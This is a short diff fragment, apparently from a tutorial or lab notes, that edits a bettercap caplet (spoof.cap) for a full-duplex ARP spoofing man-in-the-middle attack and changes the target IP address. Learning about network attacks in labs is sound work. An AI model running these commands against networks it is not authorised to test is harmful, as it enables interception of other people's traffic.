@@ -28,11 +28,13 @@ touch spoof.cap
 
 nano spoof.cap
 
+   
+   
    net.probe on
    
    set arp.spoof.fullduplex true 
    
-   set arp.spoof.targets 10.0.2.5
+   set arp.spoof.targets 192.168.0.131
    
    arp.spoof on
    
